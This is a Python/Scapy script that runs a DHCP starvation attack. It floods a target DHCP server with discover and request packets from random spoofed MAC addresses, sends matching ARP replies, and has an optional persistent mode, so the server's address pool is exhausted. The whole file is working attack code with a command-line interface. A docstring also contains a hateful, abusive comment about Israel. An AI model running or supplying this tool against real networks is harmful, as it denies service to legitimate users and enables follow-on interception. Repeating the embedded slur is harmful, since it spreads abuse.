from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP


def dhcp_discover(spoofed_mac, i_face):
    """
    sending dhcp discover from the spoofed mac address (broadcast)
#israel is not a country u pig
    :param spoofed_mac: fake mac address
    :param i_face: the systems network interface for the attack
    """
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=mac2str(spoofed_mac), dst=mac_dest, type=0x0800)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"),
                         "end"])
    sendp(dsc, iface=i_face)
    print("discover sent")


def dhcp_request(req_ip, spoofed_mac, server_ip, i_face):
    """
    sending dhcp request for a specific ip from the spoofed mac address (broadcast)

    :param req_ip: ip requested by the attacker for the fake mac address
    :param spoofed_mac: fake mac address
    :param server_ip: dhcp servers ip
    :param i_face: the systems network interface for the attack
    """
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=mac2str(spoofed_mac), dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    # generating random transaction ID
    req /= BOOTP(chaddr=mac2str(spoofed_mac),
                 xid=random.randint(1, 1000000000))
    req /= DHCP(
        options=[("message-type", "request"),
                 ("server_id", server_ip),
                 ("requested_addr", req_ip),
                 "end"])
    sendp(req, iface=i_face)
    print('request sent')


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    # Sends the is at message to the src_mac ()
    send(reply, iface=i_face)


def starve(target_ip=0, i_face=conf.iface, persistent=False):
    """
    performing the actual dhcp starvation by generating a dhcp handshake with a fake mac address
    
    :param target_ip: the ip of the targeted dhcp server, if none given than 0 (used as a flag)
    :param i_face: the systems network interface for the attack
    :param persistent: a flag indicating if the attack is persistent or temporary
    """
    cur_ip = 0
    if target_ip:
        server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
    while True:
        counter = 0
        mac = RandMAC()
        # send a dhcp discover
        dhcp_discover(spoofed_mac=mac, i_face=i_face)
        while True:
            if persistent:
                # If the persistent flag is on, and no offer is received retry after 3 seconds.
                p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
                if not len(p):
                    print("resending dhcp discover, no leases found")
                    dhcp_discover(spoofed_mac=mac, i_face=i_face)
                    continue
            else:
                # If the persistent flag is off, and no offer is received, retry after 3 seconds, 3 tries max.
                p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
                if not len(p):
                    if counter >= 3:
                        # If no answer is received after 3 tries, finish the attack.
                        print("finishing attack")
                        return
                    counter += 1
                    print("retrying")
                    dhcp_discover(spoofed_mac=mac, i_face=i_face)
                    continue
            # Check if the answer is a DHCP offer from the wanted server.
            if DHCP in p[0]:
                if p[0][DHCP].options[0][1] == 2:
                    ip = p[0][BOOTP].yiaddr
                    src = p[0][IP].src
                    if not target_ip and not src == cur_ip:
                        cur_ip = src
                        server_mac = sr1(ARP(op=1, pdst=str(src)))[0][ARP].hwsrc
                    if src == target_ip or not target_ip:
                        break
                    continue
        # Send DHCP request to the server with the given ip form the DHCP offer.
        dhcp_request(req_ip=str(ip), spoofed_mac=mac, server_ip=str(target_ip), i_face=i_face)
        arp_reply(src_ip=str(ip), source_mac=mac, server_ip=str(target_ip), server_mac=server_mac, i_face=i_face)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-p', '--persistent', default=False, action='store_true',
                        help='persistent?')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-t', '--target', metavar="TARGET", default=0, type=str,
                        help='IP of target server')

    args = parser.parse_args()

    starve(target_ip=args.target, i_face=args.iface, persistent=args.persistent)
